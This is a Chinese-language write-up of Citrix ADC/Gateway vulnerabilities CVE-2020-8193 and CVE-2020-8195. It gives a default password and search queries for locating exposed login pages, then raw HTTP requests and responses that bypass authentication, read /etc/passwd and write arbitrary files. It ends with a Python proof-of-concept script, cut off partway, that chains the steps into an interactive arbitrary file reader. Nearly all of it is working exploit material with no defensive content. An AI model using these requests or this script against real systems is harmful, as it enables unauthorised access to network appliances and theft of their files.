---
categories:
    - LDF
tags:
    - Citrix
    - LDF
---
## Citrix 简介

Citrix Systems Citrix Application Delivery Controller（ADC）等都是美国思杰系统（Citrix Systems）公司的产品。Citrix Application Delivery Controller是一款应用交付控制器。Citrix Systems Gateway（Citrix Systems NetScaler Gateway）是一套安全的远程接入解决方案。Citrix System SDWAN WAN-OP是一款SD-WAN（虚拟软件定义的广域网）设备。Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在安全漏洞。攻击者可利用该漏洞绕过权限限制。

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/1.png)

可能存在弱口令：

```
nsroot/nsroot
```
下图是后台界面：

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/6.png)


## 网络资产查找

```
title="Citrix login"&&body="NetScaler"

title="Citrix login"&&body="ADC"
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/2.png)
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/3.png)

## 绕过登录（CVE-2020-8193）
获取session

```
POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/xml
X-NITRO-USER: 123
X-NITRO-PASS: 123
Content-Length: 44

<appfwprofile><login></login></appfwprofile>
```
响应包：

```
HTTP/1.1 406 Not Acceptable
Date: Sun, 12 Jul 2020 08:04:43 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Set-Cookie: SESSID=96568bc0dee1bbf47a36cc5e215c253c; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline' http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' http://yui.yahooapis.com https://cis.citrix.com http://query.yahooapis.com https://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; connect-src 'self' http://cis.citrix.com https://s3.amazonaws.com; img-src 'self' data: blob: http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com;
Content-Length: 4489
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Content-Type: application/xml; charset=utf-8

<div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><?xml version="1.0"?>
<nitroResponse><errorcode>-1</errorcode><message>MISMATCH_OBJECTNAME_ERROR</message><severity>ERROR</severity></nitroResponse>
<div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><?xml version="1.0"?>
<nitroResponse><errorcode>-1</errorcode><message>MISMATCH_OBJECTNAME_ERROR</message><severity>ERROR</severity></nitroResponse>
<div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><?xml version="1.0"?>
<nitroResponse><errorcode>-1</errorcode><message>MISMATCH_OBJECTNAME_ERROR</message><severity>ERROR</severity></nitroResponse>
<div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><?xml version="1.0"?>
<nitroResponse><errorcode>-1</errorcode><message>MISMATCH_OBJECTNAME_ERROR</message><severity>ERROR</severity></nitroResponse>
<div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><?xml version="1.0"?>
<nitroResponse><errorcode>-1</errorcode><message>MISMATCH_OBJECTNAME_ERROR</message><severity>ERROR</severity></nitroResponse>

```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/4.png)

发送get请求，携带session 之后下一步(这里可能跳转不到后台)

```
GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
Host: xxxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SESSID=96568bc0dee1bbf47a36cc5e215c253c; is_cisco_platform=0
Connection: close

```
响应包

```
HTTP/1.1 302 Found
Date: Sun, 12 Jul 2020 08:21:26 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: is_cisco_platform=0; expires=Wed, 07-Jul-2021 08:21:26 GMT; Max-Age=31104000; path=/; HttpOnly
Location: /menu/neo
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline' http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' http://yui.yahooapis.com https://cis.citrix.com http://query.yahooapis.com https://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; connect-src 'self' http://cis.citrix.com https://s3.amazonaws.com; img-src 'self' data: blob: http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com;
Content-Length: 416
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div><div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator">An internal server error was encountered</div>
```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/5.png)



## 读取文件（CVE-2020-8195）
接着上面步骤获取`rand`;
```
GET /menu/stc HTTP/1.1
Host: xxxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SESSID=96568bc0dee1bbf47a36cc5e215c253c; is_cisco_platform=0; startupapp=neo
Connection: close


```
响应包：

```
HTTP/1.1 200 OK
Date: Sun, 12 Jul 2020 08:37:21 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline' http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' http://yui.yahooapis.com https://cis.citrix.com http://query.yahooapis.com https://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; connect-src 'self' http://cis.citrix.com https://s3.amazonaws.com; img-src 'self' data: blob: http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com;
Content-Length: 15504
Keep-Alive: timeout=15, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Citrix ADC - Statistics</title>
<link href="/admin_ui/common/css/ns/ui.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/admin_ui/common/js/jquery/_jquery.min.js"></script>
<script type="text/javascript">
//rand is used in utils.js in the URL to logout and in the URL to update NSAPI token
//rand_key & rand are used in utils.js to avoid CSRF in all POST requests
var rand = "1814865368.1594542703291956";
var rand_key = "4040129571594542703292061";
var NSERR_SESSION_EXPIRED = 444;

</script>
<script type="text/javascript" src="/admin_ui/common/js/ns/utils.js"></script>
<script type="text/javascript">
var ns_page_max_width = 1366;
var actual_ns_page_max_width = ns_page_max_width - 20;
function partitonOnClick(new_partition)
{
    var current_val = $("#current_partition").text();
    if (current_val !== new_partition)
    {
        var confirm = window.confirm("Do you want to change to partiton " + new_partition + "?");
        if(confirm === true)
        {
            var url = "/nitro/v1/config";
            var method = "POST";
            var params = "object={\"params\":{\"action\":\"switch\"},\"nspartition\":{\"partitionname\":\"" + new_partition  +"\"}}";
            var handler = new ns.ajax_handler(url, function(){
                set_cookie("drep", "");
                var href = window.location.href;
                if (/menu\/rep/.test(href) && /[?]/.test(href)) {
                    var domain_path = href.split("?")[0];
                    window.location.href = domain_path;
                    return;
                }
                window.location.reload();
            }, params, method, true, false, function(){alert('Failed to switch the partition')});

            handler.set_custom_header({"rand_key": window.rand, "NITRO_WEB_APPLICATION": "true"});
            handler.send();
        }
    }
    
};

function logoutOnClick()
{
    window.location = "/menu/lo?rand="  + rand;
};


function userInfoOnClick(id,container)
{
    var id = document.getElementById(id);
    var container = document.getElementById(container);

    if(!($(container).hasClass("header_dropdown_collapsed")))
    {
        $(container).addClass("header_dropdown_collapsed");
        $(id).slideDown();   
    }
    else
    {   
        $(container).removeClass("header_dropdown_collapsed"); 
        $(id).slideUp();
    }
}

function headerInfoOnClick(id,container)
{   
    var id = document.getElementById(id);
    var container = document.getElementById(container);

    if(!($(container).hasClass("header_dropdown_collapsed")))
    {
        $(container).addClass("header_dropdown_collapsed");
        $(container).removeClass("header_info_container"); 
        $(id).slideDown();   
    }
    else
    {   
        $(id).slideUp(); 
        $(container).removeClass("header_dropdown_collapsed"); 
        $(container).addClass("header_dropdown_container header_info_container");        
    }
   
}
function partitionInfoOnClick(id,container)
{   
    var id = document.getElementById(id);
    var container = document.getElementById(container);

    if(!($(container).hasClass("header_dropdown_collapsed")))
    {
        $(container).addClass("header_dropdown_collapsed");
        $(container).removeClass("header_info_container"); 
        $(id).slideDown();   
    }
    else
    {   
        $(id).slideUp();
        $(container).removeClass("header_dropdown_collapsed"); 
        $(container).addClass("header_dropdown_container_composite header_info_container");      
    }
}
</script>
<style type="text/css">
.ns_wp_header
{
    font-size: 150%;
}
</style>
<!--[if IE]>
<style type="text/css">
.ns_entity_div
{
    overflow: scroll;
    overflow-y: hidden;
    height: 100%;
    border: 1px;
}

.tree_links img
{
    vertical-align: middle;
}

.manage_custom_reports td
{
    vertical-align: text-top;
}

.toolbar a img
{
    border: none;
    margin: 2px 2px 2px 0px;
}

.import_reports_file
{
    filter: alpha(opacity = 0);
}

.import_reports_fake_div
{
    top: 0px;
}

.coc_combo
{
    width: auto;
}

.coc_combo_popup
{
    width: auto !important;
}
</style>
<![endif]-->
<!--[if IE 6]>
<style type="text/css">
.throughput table
{
    background-color: #ffffff;
}

.div_for_list
{
    width: 100%;
}

.change_text_size_div
{
    position: absolute;
    left: 0px;
}

.ns_body
{
    width: expression(this.parentNode.clientWidth < 940 ? "935px" : "100%" );
}

.counter_tooltip_div
{
    width: 300px;
}

.counter_tooltip_content_div
{
    height: expression(this.parentNode.clientHeight > 105 ? "100px" : "100%" );
}
</style>
<![endif]-->
</head>
<body class="ns_body">
<div id="ns_header">
</div>
<div id="loading_content" class="center_panel">
    <table align="center" role="presentation" class="loading_panel">
        <tr>
            <td class="loading_panel_img"><img src="/admin_ui/common/images/in_progress.gif" alt="In Progress"></td>
        </tr>
    </table>
</div>
<div id="ns_content" class="ns_content">
<style type="text/css">
.ns_body
{
    min-width: 500px !important;
}

.ns_content
{
    padding: 0px;
}
</style>
<script type="text/javascript" src="/admin_ui/common/js/ns/popup.js"></script>
<span id="counter_tooltip_span" class="counter_tooltip_span"></span>
<div id="counter_tooltip_div" class="popup counter_tooltip_div">
    <table class="full_width_table" cellpadding="0" cellspacing="0" role="presentation">
        <tr>
            <td id="counter_tooltip_header_cell" class="counter_tooltip_header_cell"></td>
            <td align="right"><b title="Close" tabindex="0" onkeypress="javascript: if(event.keyCode == 13) {hide_counter_tooltip(); event.preventDefault();}" onclick="hide_counter_tooltip()" class="pointer_cursor">X</b></td>
        </tr>
    </table>
    <div id="counter_tooltip_content_div" class="counter_tooltip_content_div"></div>
</div>
<script type="text/javascript" src="/admin_ui/common/js/jquery/_jquery.min.js"></script>
<div id="right_dash_pane" class ="pane_right_wrapper"><script lang="JavaScript">
var prevval = '/menu/stc?func=statns';
<!--
function callURL(text)
{
    if (prevval != text) {
        window.location.href = text
        prevval = text;
    }    
}
-->
</script>
<div class="dashboard_block_title" align="center" cellspacing="0">
<div style="float:left; width:30%; white-space: nowrap;height:40px;line-height: 40px;"><label for="groupselectid" style="display: none;">Group</label><select name="groupselect" id="groupselectid" class="header_select" onchange="JavaScript:callURL(this.value);">
<option value="/menu/stc?func=stataaa">AAA </option>
<option value="/menu/stc?func=statnsacl">ACL </option>
<option value="/menu/stc?func=statnsacl6">Extended ACL6 </option>
<option value="/menu/stc?func=stataudit">Audit Log </option>
<option value="/menu/stc?func=statauthenticationvserver">Authentication Virtual Servers </option>
<option value="/menu/stc?func=statauthorizationpolicylabel">Authorization Policy Label </option>
<option value="/menu/stc?func=statbridge">Bridge </option>
<option value="/menu/stc?func=statsystemcpu">CPU </option>
<option value="/menu/stc?func=statca">Content Accelerator </option>
<option value="/menu/stc?func=statclusterinstance">Cluster Instance </option>
<option value="/menu/stc?func=statclusternode">Cluster Node </option>
<option value="/menu/stc?func=statdnspolicylabel">DNS Policy Label </option>
<option value="/menu/stc?func=statdnsrecords">DNS Records </option>
<option value="/menu/stc?func=statdns">DNS </option>
<option value="/menu/stc?func=statnsmemory">Feature Memory </option>
<option value="/menu/stc?func=statfeo">Front End Optimization</option>
<option value="/menu/stc?func=statsystemmemory">Global Memory </option>
<option value="/menu/stc?func=stathanode">HA </option>
<option value="/menu/stc?func=statprotocolhttp">HTTP </option>
<option value="/menu/stc?func=staticapolicy">ICA Policy </option>
<option value="/menu/stc?func=statprotocolicmp">ICMP </option>
<option value="/menu/stc?func=statinat">INAT </option>
<option value="/menu/stc?func=statinatsession">INAT Session </option>
<option value="/menu/stc?func=statprotocolip">IP </option>
<option value="/menu/stc?func=stattunnelip">IP Tunnel </option>
<option value="/menu/stc?func=stattunnelip6">IPv6 Tunnel </option>
<option value="/menu/stc?func=statinterface">Interface </option>
<option value="/menu/stc?func=statnslimitidentifier">Limit Identifier</option>
<option value="/menu/stc?func=statlldp">LLDP </option>
<option value="/menu/stc?func=statmediaclassification">Media Classification </option>
<option value="/menu/stc?func=statnat64">NAT64 </option>
<option value="/menu/stc?func=statnspartition">Partition </option>
<option value="/menu/stc?func=statnspbr">PBR </option>
<option value="/menu/stc?func=statnspbr6">PBR6 </option>
<option value="/menu/stc?func=statqos">QoS </option>
<option value="/menu/stc?func=statrnatip">RNAT IP </option>
<option value="/menu/stc?func=statrnat">RNAT </option>
<option value="/menu/stc?func=statrnat6">RNAT6 </option>
<option value="/menu/stc?func=statsnmp">SNMP </option>
<option value="/menu/stc?func=statssl">SSL </option>
<option value="/menu/stc?func=statservicegroup">Service Groups </option>
<option value="/menu/stc?func=statservice">Services </option>
<option value="/menu/stc?func=statnssimpleacl">Simple ACL </option>
<option value="/menu/stc?func=statnssimpleacl6">Simple ACL6 </option>
<option value="/menu/stc?func=statstreamidentifier">Stream Identifier </option>
<option value="/menu/stc?func=statsystem">System Health</option>
<option selected value="/menu/stc?func=statns">System Overview</option>
<option value="/menu/stc?func=statprotocoltcp">TCP </option>
<option value="/menu/stc?func=statnstrafficdomain">Traffic Domain</option>
<option value="/menu/stc?func=statprotocoludp">UDP </option>
<option value="/menu/stc?func=statuservserver">User Virtual Server</option>
<option value="/menu/stc?func=statvlan">VLAN </option>
<option value="/menu/stc?func=statvxlan">VXLAN </option>
</select></div><div style="border-left: 1px solid #E7E7E7;width:26%; float: left;height:40px; padding: 0 5px;" >
<script type="text/javascript"> update_css_style("summary_div","width",  'INF%'); </script><script type="text/javascript"> update_css_style("details_div", "width", 'INF%'); </script><script type="text/javascript"> update_css_style("switch_views_div", "width" , 'INF%'); </script></div>
		<div  style="border-left: 1px solid #E7E7E7; float: left;width:44%; height:40px; padding:0 5px;"><script type="text/javascript">var rand_token_key = "1814865368.1594542703291956"</script><script type="text/javascript">
	var current_page_function = 'statns';
</script>
<div class = "floated_ellipsed_divs" style = "width: 35%"><a href = "#noAnchor" id="set_as_default_href" class="anchor_links" onkeypress="javascript: if(event.keyCode == 13) {set_as_default('dmon', current_page_function); event.preventDefault();}" onclick="set_as_default('dmon', current_page_function)" title="Remove as default group" > <div id = "set_as_default_image" class = "dashboard_images remove_default pointer_cursor"></div>Default Group</a></div><div class = "floated_ellipsed_divs"  style = "width: 25%"><a class="anchor_links" href="/menu/stc?func=statns&argname=name&detailview=NO" title="Click to refresh the page"><div class = "dashboard_images refresh_img pointer_cursor"> </div>Refresh</a></div><div class = "floated_ellipsed_divs"  id = "clear_div"><a class="anchor_links" style= "padding-right:5px;" href="#noAnchor" class="toolbar_last" onkeypress="javascript: if(event.keyCode == 13) {popup_show('clearstats_div', 'clearstats_span', 0, 13); event.preventDefault();}" onclick="javascript:popup_show('clearstats_div', 'clearstats_span', 0, 13)" title="Click to clear the stats"><div id="clearstats_span" class="dashboard_images clear_img pointer_cursor"></div>Clear</a></div><div id="clearstats_div" class="popup"><table role="presentation"><tr><td><b>Clear:</b></td><td align="right"> <img src="/admin_ui/common/images/navigate_cross.png" alt="Close" title="Close" tabindex="0" onkeypress="javascript: if(event.keyCode == 13) {popup_hide('clearstats_div'); event.preventDefault();}" onclick="popup_hide('clearstats_div')"></td></tr></td><td><select id="clear_stats_combo" title="Select the type" class="data_source_combo"><option value="Basic" title="Basic" selected>Basic</option>
<option value="Full" title="Full" >Full</option>
</select>&nbsp;</td></tr><tr><td colspan="2"><input id="clear_stats_all_cbx"type="checkbox"><span style="position:relative;top:-2px">Clear Global</span></td></tr><tr><td align="right" colspan="2" class="padding_top"><fieldset style="padding-left: 0px; padding-right: 0px; border: none;"><legend style="padding-left: 0px; padding-right: 0px; display: none;">Clear the stats</legend><input type="button" class="flat_button" value="OK" onkeypress="javascript: if(event.keyCode == 13) {clear_stats_ok_clicked('statns', ''); event.preventDefault();}" onclick="javaScript:clear_stats_ok_clicked('statns', '')" title="Click to clear the stats"/><input type="button" class="flat_button" value="Close" onkeypress="javascript: if(event.keyCode == 13) {popup_hide('clearstats_div'); event.preventDefault();}" onclick="popup_hide('clearstats_div')" title="Click to close"/></fieldset></td></tr></table></div><div class = "floated_ellipsed_divs" style = "width: 10%;"><a href="#noAnchor" class="anchor_links" onkeypress="javascript: if(event.keyCode == 13) {openwindow('/help/db/dashboard.htm#ns_html_dashboard-landing_page_ref.html', 'Dashboard_Help1_1814865368.1594542703291956', 'Help', screen.width, screen.height); event.preventDefault();}" onclick="openwindow('/help/db/dashboard.htm#ns_html_dashboard-landing_page_ref.html', 'Dashboard_Help1_1814865368.1594542703291956', 'Help', screen.width, screen.height)" title="Click to obtain help related to this screen" aria-label="Click to obtain help related to this screen"><span style="display:none">lick to obtain help related to this screen</span>Help</a></div><div class = "floated_ellipsed_divs" style = "width: 2%;">&nbsp;&nbsp;</div><div class = "floated_ellipsed_divs" style = "width: 6%">&nbsp;<a href="#noAnchor" onkeypress="javascript: if(event.keyCode == 13) {openwindow('/menu/stc?func=statns&argname=name&detailview=NO&popup=yes', 'DASHBOARD_POPUP', 'Dashboard', screen.width, screen.height); event.preventDefault();}" onclick="openwindow('/menu/stc?func=statns&argname=name&detailview=NO&popup=yes', 'DASHBOARD_POPUP', 'Dashboard', screen.width, screen.height)" title="Open System Overview in a new window." aril-label="Open System Overview in a new window."><span class = "dashboard_images popout_img pointer_cursor"></span><span style="display:none">lick to obtain help related to this screen</span></a></div>&nbsp;</div>
</div>
<p align="center" class="ns_alert_text"><b>Error retrieving data.<br>return code = 354.<br>Error message = Invalid username or password.<br></b></p></div>

```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/7.png)

### 读取文件
(发现登录超时了，重新获取session),可以读取`/etc/passwd`,但读取不了`/etc/shadow`

```
POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
Host: xxxx
User-Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/xml
X-NITRO-USER: 123
X-NITRO-PASS: 123
rand_key: 1814865368.1594542703291956
Cookie: SESSID=880c67528fa226f2657262c220fc13ec; is_cisco_platform=0; startupapp=neo
Content-Length: 31

<clipermission></clipermission>
```
响应包：

```
HTTP/1.1 406 Not Acceptable
Date: Sun, 12 Jul 2020 08:39:08 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Expires: -1
Cache-Control: private, must-revalidate, post-check=0, pre-check=0
Pragma: private
Content-Disposition: attachment;filename="passwd"
Accept-Ranges: bytes
Content-Length: 1559
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline' http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' http://yui.yahooapis.com https://cis.citrix.com http://query.yahooapis.com https://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com; connect-src 'self' http://cis.citrix.com https://s3.amazonaws.com; img-src 'self' data: blob: http://cdn.pendo.io https://data.pendo.io https://pendo-static-5175857953112064.storage.googleapis.com;
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Content-Type: application/octet-stream

# $FreeBSD: release/8.4.0/etc/master.passwd 243948 2012-12-06 11:54:25Z rwatson $
#
root:*:0:0:Charlie &:/root:/usr/bin/bash
nsroot:*:0:0:Netscaler Root:/root:/netscaler/nssh
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/sbin/nologin
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
nsmonitor:*:65532:65534:Netscaler Monitoring user:/var/nstmp/monitors:/usr/sbin/nologin

```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/8.png)

## 创建文件

```
POST /rapi/uploadtext HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xxx/menu/neo
DNT: 1
rand_key: 780002221.1594548641724288
X-NITRO-USER: 123
X-NITRO-PASS: 123
Connection: close
Cookie: startupapp=neo; is_cisco_platform=0; st_splitter=350px; SESSID=7cfd4f59ef2e78b857ac828f8653b4f2; rdx_pagination_size=25%20Per%20Page
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

object={"uploadtext":{"filedir":"/tmp","filedata":"test","filename":"test.txt"}}
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/9.png)

## 创建文件夹


```
POST /rapi/uploadtext HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xxx/menu/neo
DNT: 1
rand_key: 780002221.1594548641724288
X-NITRO-USER: henk
X-NITRO-PASS: henk
Connection: close
Cookie: startupapp=neo; is_cisco_platform=0; st_splitter=350px; SESSID=7cfd4f59ef2e78b857ac828f8653b4f2; rdx_pagination_size=25%20Per%20Page
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

object={"uploadtext":{"filedir":false,"filedata":"data","filename":"/var/tmp/new_directory/this_will_be_removed"}}
```


![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/7-12/10.png)

## poc脚本
citirx.py

```
import requests
import sys
import string
import random
import json
from urllib.parse import quote



requests.packages.urllib3.disable_warnings()

def random_string(length=8):
	chars = string.ascii_letters + string.digits
	random_string = ''.join(random.choice(chars) for x in range(length))
	return random_string

def create_session(base_url, session):
	url = '{0}/pcidss/report'.format(base_url)

	params = {
		'type':'allprofiles',
		'sid':'loginchallengeresponse1requestbody',
		'username':'nsroot',
		'set':'1'
	}

	headers = {
		'Content-Type':'application/xml',
		'X-NITRO-USER':random_string(),
		'X-NITRO-PASS':random_string(),
	}

	data = '<appfwprofile><login></login></appfwprofile>'
	#proxies = {"http":"http://127.0.0.1:8080/"}
	session.post(url=url, params=params, headers=headers, data=data, verify=False)
	return session

def fix_session(base_url, session):
	url = '{0}/menu/ss'.format(base_url)

	params = {
		'sid':'nsroot',
		'username':'nsroot',
		'force_setup':'1'
	}
	#proxies = {"http":"http://127.0.0.1:8080/"}
	session.get(url=url, params=params, verify=False)

def get_rand(base_url, session):
	url = '{0}/menu/stc'.format(base_url)
	#proxies = {"http":"http://127.0.0.1:8080/"}
	r = session.get(url=url, verify=False)

	for line in r.text.split('\n'):
		if 'var rand =' in line:
			rand = line.split('"')[1]
			return rand

def do_lfi(base_url, session, rand):
	url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD)

	headers = {
		'Content-Type':'application/xml',
		'X-NITRO-USER':random_string(),
		'X-NITRO-PASS':random_string(),
		'rand_key':rand
	}

	data = '<clipermission></clipermission>'
	#proxies = {"http":"http://127.0.0.1:8080/"}
	r = session.post(url=url, headers=headers, data=data, verify=False)
	response_str = json.dumps(r.headers.__dict__['_store'])

	if r.status_code == 406 and "Content-Disposition" in response_str and r.headers["Accept-Ranges"] == "bytes" and r.headers["Pragma"] == "private":
		print ("[+] Send Success!")
		print ("_"*80,"\n\n")
		print (r.text)
		print ("_"*80)
		while 1:
			PAYLOAD1 = quote(input("\n[+] Set File= "),"utf-8")
			url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD1)
			r = session.post(url=url, headers=headers, data=data, verify=False)
